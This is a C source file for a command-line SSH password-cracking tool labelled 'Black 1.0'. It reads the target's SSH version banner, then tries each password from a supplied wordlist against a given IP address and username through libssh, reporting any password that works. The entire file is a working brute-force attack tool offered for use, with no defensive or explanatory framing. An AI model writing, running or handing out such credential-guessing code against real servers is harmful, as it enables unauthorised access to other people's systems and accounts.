#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <libssh/libssh.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdbool.h>
#include <unistd.h>
#include <pthread.h>

#define BUFFER_SIZE 4096
#define VERSION "Black 1.0"

int os_path_exists(const char *path)
{
    if (access(path, F_OK) != -1){
        return 0;
    } else {
        return -1;
    }
}

void banner_show(){
    char banner[65556];
    strcat(banner,"\033[31m");
    strcat(banner," _____  _____  __ __    _____  _____  _____  _____  __ ___ _____  _____ \n");
    strcat(banner,"/  ___>/  ___>/  |  \\  /     \\/  _  \\/  _  \\/     \\|  |  //   __\\/  _  \\\n");
    strcat(banner,"|___  ||___  ||  _  |  |  |--||  _  <|  _  ||  |--||  _ < |   __||  _  <\n");
    strcat(banner,"<_____/<_____/\\__|__/  \\_____/\\__|\\_/\\__|__/\\_____/|__|__\\_____/\\__|\\_/\033[00m\n\n");
    strcat(banner,"                [ Created By \033[31mUnam3dd\033[00m ]\n");
    strcat(banner,"                [   Github : https://github.com/\033[31mUnam3dd\033[00m/ ]\n");
    strcat(banner,"                   Version : \033[31m");
    strcat(banner,VERSION);
    strcat(banner,"\033[00m\n");
    strcat(banner,"\n\n");
    printf("%s",banner);
}

void get_version(char *target_ip){
    struct sockaddr_in so_variable;
    struct hostent *host_variable;
    struct in_addr *addr_variable;
    int error_socket, socks;
    strncpy((char*)&so_variable, "", sizeof(so_variable));
    so_variable.sin_family = AF_INET;
    so_variable.sin_addr.s_addr = inet_addr(target_ip);
    so_variable.sin_port = htons(22);
    socks = socket(AF_INET, SOCK_STREAM, 0);
    error_socket = connect(socks, (struct sockaddr*)&so_variable, sizeof(so_variable));
    
    if(error_socket < 0){
        printf("\033[31m[!] Error %s:22 Not Connected !\n",target_ip);
        exit(-1);
    }
    
    int data_recv;
    char buffer[BUFFER_SIZE];
    data_recv = recv(socks,buffer,sizeof buffer - 1, 0);
    
    if(data_recv < 0){
        perror("[*] Error Recv Data !\n");
    }
    
    buffer[data_recv] = 0;
    char *p = strstr(buffer,"\r\n");
    
    if (p != NULL)
    {
        *p = 0;
        printf("\033[32m[\033[34m+\033[32m] Version SSH : \033[33m%s\033[00m\n\n", buffer);
    }
}



void exit_session(ssh_session session)
{
    ssh_disconnect(session);
    ssh_free(session);
}


void error(ssh_session session)
{
    fprintf(stderr, "\033[31m[!] Error: %s\n\033[00m", ssh_get_error(session));
    exit_session(session);
    exit(-1);
}

int ssh_connect_main(char *ip,char *username,char *password){
    ssh_session session;

    int ssh_s, port = 22;
    char buffer[BUFFER_SIZE];
    unsigned int bytes;
    session = ssh_new();
    if (session == NULL) exit(-1);
    ssh_options_set(session, SSH_OPTIONS_HOST, ip);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_s = ssh_connect(session);
    if (ssh_s != SSH_OK) error(session);
    ssh_s = ssh_userauth_password(session, NULL, password);
    if (ssh_s != SSH_AUTH_SUCCESS) return 1;
    ssh_disconnect(session);
    ssh_free(session);
    return 0;
}

struct arg_struct {
    char *ip;
    char *username;
    char *password;
};

void *ssh_connect_thread(void *arguments){
    struct arg_struct *args_point = (struct arg_struct *)arguments;

    char target_ip[BUFFER_SIZE];
    char target_username[BUFFER_SIZE];
    char target_password[BUFFER_SIZE];
    sprintf(target_ip,"%s",args_point->ip);
    sprintf(target_username,"%s",args_point->username);
    sprintf(target_password,"%s",args_point->password);

    int crack_ssh = ssh_connect_main(target_ip,target_username,target_password);
    if (crack_ssh ==0){
        printf("\033[32m[\033[34m+\033[32m] Password Found !\n\033[32m[\033[34m+\033[32m] IP : \033[33m%s\033[00m\n\033[32m[\033[34m+\033[32m] User : \033[33m%s\033[00m\n\033[32m[\033[34m+\033[32m] Password : \033[33m%s\033[00m\n\n\n",target_ip,target_username,target_password);
        exit(0);
    } else {
        printf("\033[32m[\033[31m-\033[32m] Password Failed ! : \033[31m%s\033[00m\n\n",target_password);
    }
}

int main(int argc,char *argv[]){
    banner_show();
    if (argc<4){
        printf("usage : \033[31m%s\033[00m <\033[31mip\033[00m> <\033[31musername\033[00m> <\033[31mpasslist\033[00m>\n",argv[0]);
    } else {
        if (os_path_exists(argv[3]) ==0){
            printf("\033[32m[\033[34m+\033[32m] \033[33m%s\033[00m Found !\n\n",argv[3]);
            get_version(argv[1]);
            FILE * fp;
            char * line = NULL;
            size_t lenght_lines = 0;
            ssize_t read_lines;

            fp = fopen(argv[3],"r");
            
            if (fp == NULL){
                exit(EXIT_FAILURE);
            
            }

            while ((read_lines = getline(&line, &lenght_lines, fp)) != -1){
                //printf("\033[32m[\033[33m?\033[32m] Try Password : %s\n",line);
                char *split_line = strtok(line,"\n");
                struct arg_struct params;
                params.ip = argv[1];
                params.username = argv[2];
                params.password = split_line;
                pthread_t thread_id;
                //sleep((float)0.1);
                pthread_create(&thread_id, NULL, &ssh_connect_thread, (void *)&params);
                pthread_join(thread_id,NULL);
            }
            fclose(fp);

        } else {
            printf("\033[32m[\033[31m-\033[32m] \033[31m%s Not Found !\033[00m\n",argv[3]);
        }
    }
    return 0;
}